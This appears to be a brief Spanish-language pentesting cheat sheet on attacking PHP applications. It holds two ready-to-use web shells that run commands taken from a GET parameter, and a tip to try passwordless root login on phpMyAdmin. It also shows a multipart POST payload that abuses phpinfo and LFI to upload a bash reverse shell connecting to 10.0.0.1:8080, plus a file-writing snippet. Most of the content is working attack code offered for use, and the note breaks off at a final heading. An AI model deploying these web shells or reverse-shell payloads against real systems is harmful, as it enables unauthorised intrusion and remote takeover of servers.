# Cmd.php

```php
<?php
  system($_GET['cmd']);
?>
```

```php
<?php
	$c=$_GET['cmd'];
	echo `$c`;
?>
```

# PHP MyAdmin

1. En ocasiones permite autenticación sin contraseña, por lo que conviene probar con *root*.
2. Si somos capaces de ver la versión, buscar si existen vulnerabilidades.
# info.php

Si somos capaces de ver un *info.php* ó llamar a la función [[php#Funciones útiles#phpinfo|phpinfo]]:

- Podemos ver funciones deshabilitadas (`disable_functions`)
- Si `file_uploads` está en **true**, podemos abusar de un [[LFI]] para conseguir [[RCE]]. Para ello debemos tramitar una petición por **POST** al propio recurso *info.php* (mediante [[burpsuite]]) con una estructura como la siguiente:

```
POST [...]

Content-Type: multipart/form-data; boundary=--pwned

----pwned
Content-Disposition: form-data; name="name"; filename="cmd.php"
Content-Type: text-plain

<?php system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"); ?>
----pwned
```

# Funciones útiles

## Crear un archivo

Con *file_put_contents* podemos crear un archivo especificando su contenido:

```php
file_put_contents('<nombre>', '<contenido>');
```

## phpinfo